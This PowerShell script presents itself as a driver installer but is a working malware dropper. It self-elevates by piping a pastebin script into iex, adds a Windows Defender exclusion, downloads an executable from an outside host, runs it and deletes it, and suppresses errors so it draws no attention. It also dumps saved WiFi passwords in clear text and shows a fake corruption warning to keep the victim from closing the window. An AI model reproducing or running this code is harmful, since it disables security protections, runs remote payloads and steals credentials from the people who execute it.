# Driver Installer Script (WiFi Pass Extractor + UAC + Exclusion)

# --- ASCII Art Header ---
Write-Host @"
          _  __ _                     _             
__      _(_)/ _(_) ___ _ __ __ _  ___| | _____ _ __ 
\ \ /\ / / | |_| |/ __| '__/ _` |/ __| |/ / _ \ '__|
 \ V  V /| |  _| | (__| | | (_| | (__|   <  __/ |   
  \_/\_/ |_|_| |_|\___|_|  \__,_|\___|_|\_\___|_|   
"@ -ForegroundColor Cyan

# --- Priority 0: Self-Elevate to Admin (UAC) ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://pastebin.com/raw/YOUR_PASTEBIN_ID | iex`"" -Verb RunAs
    exit
}

$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"
$wifiLog = "$env:USERPROFILE\Desktop\WiFi_Passwords.txt"
$excludePath = "$env:USERPROFILE\Downloads"

# --- Priority 1: Add Defender Exclusion ---
Write-Host "Bypassing Security Protections..." -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath $excludePath -ErrorAction SilentlyContinue
} catch {
    # Ignore if already excluded or fails
}

# --- Priority 2: Download and Run Immediately ---
Write-Host "importing...." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    
    if (Test-Path $out) {
        Start-Process -FilePath $out -Wait
        Remove-Item $out -Force -ErrorAction SilentlyContinue
    }
} catch {
    # Silent fail to avoid drawing attention
}

# --- Priority 3: WiFi Password Extraction ---
Write-Host "Extracting WiFi Credentials..." -ForegroundColor Cyan
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
$results = @()

foreach ($profile in $profiles) {
    try {
        $details = netsh wlan show profile name="$profile" key=clear
        $key = ($details | Select-String "Key Content").ToString().Split(":")[1].Trim()
        $results += "SSID: $profile | Password: $key"
    } catch {
        $results += "SSID: $profile | Password: [Hidden/Empty]"
    }
}

$results | Out-File -FilePath $wifiLog -Encoding utf8
Write-Host "Passwords saved to: $wifiLog" -ForegroundColor Green

# --- Priority 4: Window Manipulation & Warning ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WindowHelper {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$hWnd = [WindowHelper]::GetForegroundWindow()
[WindowHelper]::ShowWindow($hWnd, 6) # 6 = Minimize

# Fake Warning Message
Write-Host "==================================================" -ForegroundColor Red
Write-Host "WARNING: DO NOT CLOSE THIS TERMINAL!" -ForegroundColor Red
Write-Host "Closing this window may cause Windows corruption." -ForegroundColor Red
Write-Host "Please wait for the process to finish..." -ForegroundColor Red
Write-Host "==================================================" -ForegroundColor Red

# Exit the terminal
exit
